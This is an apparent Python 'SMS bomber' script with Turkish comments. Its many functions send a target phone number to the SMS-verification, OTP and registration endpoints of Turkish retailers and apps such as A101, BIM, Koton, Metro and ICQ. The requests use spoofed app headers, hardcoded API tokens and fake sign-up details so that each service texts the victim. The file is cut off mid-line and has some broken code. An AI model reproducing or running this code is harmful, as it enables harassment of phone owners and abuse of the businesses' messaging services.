try:
    import requests
    import urllib3
    import uuid
    import subprocess  # subprocess modülünü içe aktar

except ImportError:
    print("Gerekli modüller indiriliyor bekleyiniz...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests==2.28.2", "urllib3==1.26.13", "uuid==1.30"])

finally:
    import concurrent.futures
    import json
    import os
    import sys
    import random
    import time
    import urllib
    import urllib3
    import uuid

def a101(number):
    try:
        url = "https://www.a101.com.tr/users/otp-login/"
        payload = {
            "phone": f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "A101"
        else:
            return False, "A101"
    except Exception as e:
        return False, f"A101: {str(e)}"



def bim(number):
    try:
        url = "https://bim.veesk.net/service/v1.0/account/login"
        payload = {
            "phone" : f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "BIM: SMS gönderildi"
        else:
            return False, "BIM: SMS gönderilemedi"
    except Exception as e:
        return False, f"BIM: {str(e)}"

def defacto(number):
    try:
        url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
        payload = {
            "mobilePhone" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["Data"]
        if r1 == "IsSMSSend":
            return True, "Defacto: SMS gönderildi"
        else:
            return False, "Defacto: SMS gönderilemedi"
    except Exception as e:
        return False, f"Defacto: {str(e)}"

def istegelsin(number):
    try:
        url = "https://prod.fasapi.net/"
        payload = {
            "query" : "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
            "variables" : {
                "phoneNumber" : f"90{number}"
            }
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "İsteGelsin: SMS gönderildi"
        else:
            return False, "İsteGelsin: SMS gönderilemedi"
    except Exception as e:
        return False, f"İsteGelsin: {str(e)}"


#BURDAN DEVAM EDECEGİZ MAİN.PY

def KahveDunyasi(number):    
    try:    
        url = "https://core.kahvedunyasi.com:443/api/users/sms/send"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Page-Url": "/kayit-ol",
            "Content-Type": "application/json;charset=utf-8",
            "Positive-Client": "kahvedunyasi",
            "Positive-Client-Type": "web",
            "Store-Id": "1",
            "Origin": "https://www.kahvedunyasi.com",
            "Dnt": "1",
            "Sec-Gpc": "1",
            "Referer": "https://www.kahvedunyasi.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Te": "trailers",
            "Connection": "close"
        }
        json_data = {"mobile_number": number, "token_type": "register_token"}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.status_code == 200:
            return True, "KahveDunyasi: SMS gönderildi"
        else:
            return False, "KahveDunyasi: SMS gönderilemedi"
    except:    
        return False, "KahveDunyasi: Hata oluştu"

def Wmf(number):
    try:
        wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
            "confirm": "true",
            "date_of_birth": "1956-03-01",
            "email": "",  # Replace with appropriate email data
            "email_allowed": "true",
            "first_name": "Memati",
            "gender": "male",
            "last_name": "Bas",
            "password": "31ABC..abc31",
            "phone": f"0{number}"
        }, timeout=6)
        if wmf.status_code == 202:
            return True, "Wmf: SMS gönderildi"
        else:
            return False, "Wmf: SMS gönderilemedi"
    except:
        return False, "Wmf: Hata oluştu"

def Icq(number):
    try:
        url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{number}&platform=ios&r=796356153&smsFormatType=human"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate"
        }
        r = requests.post(url, headers=headers, timeout=6)
        if r.json()["response"]["statusCode"] == 200:
            return True, "Icq: SMS gönderildi"
        else:
            return False, "Icq: SMS gönderilemedi"
    except:
        return False, "Icq: Hata oluştu"



def Suiste(number):
    try:
        url = "https://suiste.com:443/api/auth/code"
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "Accept-Encoding": "gzip, deflate",
            "Mobillium-Device-Id": "56DB9AC4-F52B-4DF1-B14C-E39690BC69FC",
            "User-Agent": "suiste/1.6.16 (com.mobillium.suiste; build:1434; iOS 15.7.7) Alamofire/5.6.4",
            "Accept-Language": "en"
        }
        data = {"action": "register", "gsm": number}
        r = requests.post(url, headers=headers, data=data, timeout=6)
        if r.json()["code"] == "common.success":
            return True, "Suiste: SMS gönderildi"
        else:
            return False, "Suiste: SMS gönderilemedi"
    except:
        return False, "Suiste: Hata oluştu"
            
    
def Evidea(number):
    try:
        url = "https://www.evidea.com:443/users/register/"
        headers = {
            "Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi",
            "X-Project-Name": "undefined",
            "Accept": "application/json, text/plain, */*",
            "X-App-Type": "akinon-mobile",
            "X-Requested-With": "XMLHttpRequest",
            "Accept-Language": "tr-TR,tr;q=0.9",
            "Cache-Control": "no-store",
            "Accept-Encoding": "gzip, deflate",
            "X-App-Device": "ios",
            "Referer": "https://www.evidea.com/",
            "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0",
            "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"
        }
        data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{number}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
        r = requests.post(url, headers=headers, data=data, timeout=6)
        if r.status_code == 202:
            return True, "Evidea: SMS gönderildi"
        else:
            return False, "Evidea: SMS gönderilemedi"
    except:
        return False, "Evidea: Hata oluştu"

def Ucdortbes(number):
    try:
        url = "https://api.345dijital.com:443/api/users/register"
        headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
        json={"email": "", "name": "Memati", "phoneNumber": f"+90{number}", "surname": "Bas"}
        r = requests.post(url, headers=headers, json=json, timeout=6)
        if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
            return False, "345dijital.com: SMS gönderilemedi"
        else:
            raise
    except:
        return True, "345dijital.com: Hata oluştu"


def Ayyildiz(number):
    try:
        url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={number}"
        headers = {"Accept": "*/*", "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS", "Devicetype": "mobileapp", "Accept-Encoding": "gzip, deflate", "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"}
        r = requests.post(url, headers=headers, timeout=6)
        if r.json()["Success"] == True:
            return True, "ayyildiz.com.tr: SMS gönderildi"
        else:
            raise
    except:
        return False, "ayyildiz.com.tr: SMS gönderilemedi"



def Naosstars(number):
    try:
        url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
        headers = {
            "Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
            "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0",
            "Access-Control-Allow-Origin": "*",
            "Locale": "en-TR",
            "Version": "1.0030",
            "Os": "ios",
            "Apiurl": "https://api.naosstars.com/api/",
            "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC",
            "Platform": "ios",
            "Accept-Language": "en-US,en;q=0.9",
            "Timezone": "Europe/Istanbul",
            "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517",
            "Timezoneoffset": "-180",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip, deflate",
            "Apitype": "mobile_app"
        }
        json_data = {"telephone": f"+90{number}", "type": "register"}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.status_code == 200:
            return True, "naosstars.com"
        else:
            raise Exception("Failed to send SMS in Naosstars")
    except Exception as e:
        return False, f"naosstars.com: {str(e)}"


def Koton(number):
    try:
        url = "https://www.koton.com:443/users/register/"
        headers = {
            "Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk",
            "X-Project-Name": "rn-env",
            "Accept": "application/json, text/plain, */*",
            "X-App-Type": "akinon-mobile",
            "X-Requested-With": "XMLHttpRequest",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-store",
            "Accept-Encoding": "gzip, deflate",
            "X-App-Device": "ios",
            "Referer": "https://www.koton.com/",
            "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0",
            "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"
        }
        data = """--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="first_name"

Memati
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="last_name"

Bas
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="email"

{self.mail}
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="password"

31ABC..abc31
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="phone"

{number}
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data: form-data; name="confirm"

true
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data: form-data; name="sms_allowed"

true
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data: form-data; name="email_allowed"

true
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data: form-data; name="date_of_birth"

1993-07-02
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data: form-data; name="call_allowed"

true
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data: form-data; name="gender"

--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--"""
        r = requests.post(url, headers=headers, data=data, timeout=6)
        if r.status_code == 202:
            return True, "koton.com"
        else:
            raise Exception("Failed to send SMS in Koton")
    except Exception as e:
        return False, f"koton.com: {str(e)}"


def Metro(number):
    try:
        url = "https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip, deflate",
            "Applicationversion": "2.1.1",
            "Applicationplatform": "2",
            "User-Agent": "Metro Turkiye/2.1.1 (com.mcctr.mobileapplication; build:1; iOS 15.7.7) Alamofire/2.1.1",
            "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9",
            "Connection": "close"
        }
        json_data = {"methodType": "2", "mobilePhoneNumber": f"+90{number}"}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.json()["status"] == "success":
            return True, "metro-tr.com"
        else:
            raise Exception("Failed to send SMS in Metro")
    except Exception as e:
        return False, f"metro-tr.com: {str(e)}"


def Akasya(number):
    try:
        url = "https://akasya-admin.poilabs.com:443/v1/tr/sms"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/json",
            "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5",
            "User-Agent": "Akasya",
            "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9",
            "Accept-Encoding": "gzip, deflate, br"
        }
        json_data = {"phone": number}
        r = requests.post(url=url, headers=headers, json=json_data, timeout=6)
        if r.json()["result"] == "SMS sended succesfully!":
            return True, "akasya-admin.poilabs.com"
        else:
            raise Exception("Failed to send SMS in Akasya")
    except Exception as e:
        return False, f"akasya-admin.poilabs.com: {str(e)}"


def Akbati(number):
    try:
        url = "https://akbati-admin.poilabs.com:443/v1/tr/sms"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/json",
            "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3",
            "User-Agent": "Akbat",
            "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9",
            "Accept-Encoding": "gzip, deflate, br"
        }
        json_data = {"phone": number}
        r = requests.post(url=url, headers=headers, json=json_data, timeout=6)
        if r.json()["result"] == "SMS sended succesfully!":
            return True, "akbati-admin.poilabs.com"
        else:
            raise Exception("Failed to send SMS in Akbati")
    except Exception as e:
        return False, f"akbati-admin.poilabs.com: {str(e)}"



def Clickme(number):
    try:
        url = "https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code"
        headers = {"Content-Type": "application/json", "Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc", "Client-Version": "1.4.0", "Client-Device": "IOS", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "ClickMeLive/20 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
        json_data={"phone": number}
        r = requests.post(url=url, json=json_data, headers=headers, timeout=6)
        if r.json()["isSuccess"] == True:
            return True, "mobile-gateway.clickmelive.com"
        else:
            raise Exception("Failed to send SMS in Clickme")
    except Exception as e:
        return False, f"mobile-gateway.clickmelive.com: {str(e)}"


def Happy(number):
    try:
        url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone"
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "Origin": "https://www.happy.com.tr", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", "Referer": "https://www.happy.com.tr/index.php?route=account/register"}
        data = {"telephone": number}
        r = requests.post(url=url, data=data, headers=headers, timeout=6)
        if r.status_code == 200:
            return True, "happy.com.tr"
        else:
            raise Exception("Failed to send SMS in Happy")
    except Exception as e:
        return False, f"happy.com.tr: {str(e)}"


def Komagene(number):
    try:
        url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
        json_data={"Telefon": number,"FirmaId": "32"}
        headers = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"}
        r = requests.post(url=url, headers=headers, json=json_data, timeout=6)
        if r.json()["Success"] == True:
            return True, "gateway.komagene.com.tr"
        else:
            raise Exception("Failed to send SMS in Komagene")
    except Exception as e:
        return False, f"gateway.komagene.com.tr: {str(e)}"


def KuryemGelsin(number):
    try:
        url = "https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/"
        json_data={"phoneNumber": number, "phone_country_code": "+90"}
        r = requests.post(url=url, json=json_data, timeout=6)
        if r.status_code == 200:
            return True, "api.kuryemgelsin.com"
        else:
            raise Exception("Failed to send SMS in KuryemGelsin")
    except Exception as e:
        return False, f"api.kuryemgelsin.com: {str(e)}"



def Porty(number):
    try:
        url = "https://panel.porty.tech:443/api.php?"
        headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hn
